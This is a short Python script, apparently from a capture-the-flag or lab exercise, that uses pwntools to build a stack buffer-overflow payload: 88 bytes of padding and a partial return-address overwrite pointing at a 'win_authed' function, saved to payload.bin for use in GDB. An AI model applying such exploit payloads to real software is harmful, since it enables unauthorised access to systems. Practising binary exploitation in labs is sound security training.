from pwn import *

# Just generate the payload without running
payload = b'A' * 88  # Padding
payload += b'\x77'
payload += b'\x33\x16'  # win_authed address

print("Payload bytes (hex):", payload.hex())
print("Payload length:", len(payload))

# Save to file for GDB input
with open('payload.bin', 'wb') as f:
    f.write(payload)

print("Payload saved to payload.bin")
